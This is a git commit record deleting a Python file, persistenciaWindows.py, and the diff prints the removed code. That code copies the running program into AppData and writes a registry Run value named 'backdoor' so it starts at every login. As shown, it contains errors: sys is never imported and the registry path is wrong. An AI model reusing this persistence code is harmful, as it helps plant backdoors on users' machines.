11087124ad67a911960e2d028242d988861861d1
kenderperez <kenderperez1995@gmail.com>
2020-04-28 01:07:47 -0400

    Delete persistenciaWindows.py

--- persistenciaWindows.py
+++
@@ -1,8 +0,0 @@
-#! python3
-import os, subprocess, shutil
-def persistencia():
-	location = os.environ['appdata'] + '\\program.exe'
-	if not os.path.exists(location):
-		shutil.copyfile(sys.executable, location)
-		subprocess.call('reg add HKCU\Software\Microsoft\CurrentVersion\run /v backdoor /t REG_SZ /d"' + location + '"', shell=True)
-		
